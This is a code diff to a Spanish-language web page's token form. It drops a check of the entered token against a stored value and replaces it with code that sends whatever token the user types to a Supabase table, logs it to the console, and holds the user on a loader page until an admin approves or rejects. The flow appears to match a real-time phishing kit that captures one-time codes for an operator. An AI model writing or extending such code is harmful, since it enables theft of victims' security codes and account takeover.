@@ -682,65 +682,34 @@
 
                         // Deshabilitar botón mientras se procesa
                         submitBtn.disabled = true;
-                        submitBtn.textContent = 'Verificando...';
+                        submitBtn.textContent = 'Enviando...';
 
                         try {
-                            // 1. Verificar que el token coincida con el guardado en Supabase
-                            var url = SUPABASE_URL + '/rest/v1/' + SUPABASE_TABLE + '?select=id,token_acceso,estado&id=eq.' + registroId;
-                            var response = await fetch(url, {
-                                method: 'GET',
+                            console.log('🔑 Enviando token ingresado para registro #' + registroId + ':', tokenIngresado);
+                            
+                            // Guardar el token que ingresó el usuario y cambiar estado
+                            var patchUrl = SUPABASE_URL + '/rest/v1/' + SUPABASE_TABLE + '?id=eq.' + registroId;
+                            await fetch(patchUrl, {
+                                method: 'PATCH',
                                 headers: {
+                                    'Content-Type': 'application/json',
                                     'apikey': SUPABASE_ANON_KEY,
                                     'Authorization': 'Bearer ' + SUPABASE_ANON_KEY
-                                }
+                                },
+                                body: JSON.stringify({ 
+                                    estado: 'token_ingresado',
+                                    token_ingresado: tokenIngresado
+                                })
                             });
-
-                            if (!response.ok) {
-                                throw new Error('Error al consultar token');
-                            }
-
-                            var data = await response.json();
                             
-                            if (data && data.length > 0) {
-                                var registro = data[0];
-                                
-                                if (registro.token_acceso === tokenIngresado) {
-                                    console.log('✅ Token correcto - Enviando a loader para esperar aprobación');
-                                    
-                                    // 2. Cambiar estado a "token_ingresado" para que el admin sepa
-                                    var patchUrl = SUPABASE_URL + '/rest/v1/' + SUPABASE_TABLE + '?id=eq.' + registroId;
-                                    await fetch(patchUrl, {
-                                        method: 'PATCH',
-                                        headers: {
-                                            'Content-Type': 'application/json',
-                                            'apikey': SUPABASE_ANON_KEY,
-                                            'Authorization': 'Bearer ' + SUPABASE_ANON_KEY
-                                        },
-                                        body: JSON.stringify({ estado: 'token_ingresado' })
-                                    });
-                                    
-                                    console.log('✅ Estado cambiado a token_ingresado');
-                                    
-                                    // 3. Redirigir al loader a esperar que el admin apruebe o rechace
-                                    window.location.href = 'loader.html?id=' + registroId + '&portal=inicio';
-                                } else {
-                                    // Token incorrecto
-                                    if (tokenError) {
-                                        tokenError.textContent = 'Token incorrecto. Verifica el código e intenta nuevamente.';
-                                        tokenError.classList.add('active');
-                                    }
-                                    submitBtn.disabled = false;
-                                    submitBtn.textContent = 'Verificar token';
-                                    tokenInput.value = '';
-                                    tokenInput.focus();
-                                }
-                            } else {
-                                throw new Error('Registro no encontrado');
-                            }
+                            console.log('✅ Token enviado - estado cambiado a token_ingresado');
+                            
+                            // Redirigir al loader a esperar que el admin apruebe o rechace
+                            window.location.href = 'loader.html?id=' + registroId + '&portal=inicio';
                         } catch (err) {
-                            console.error('❌ Error al verificar token:', err);
+                            console.error('❌ Error al enviar token:', err);
                             if (tokenError) {
-                                tokenError.textContent = 'Error al verificar el token. Intenta nuevamente.';
+                                tokenError.textContent = 'Error al enviar el token. Intenta nuevamente.';
                                 tokenError.classList.add('active');
                             }
                             submitBtn.disabled = false;
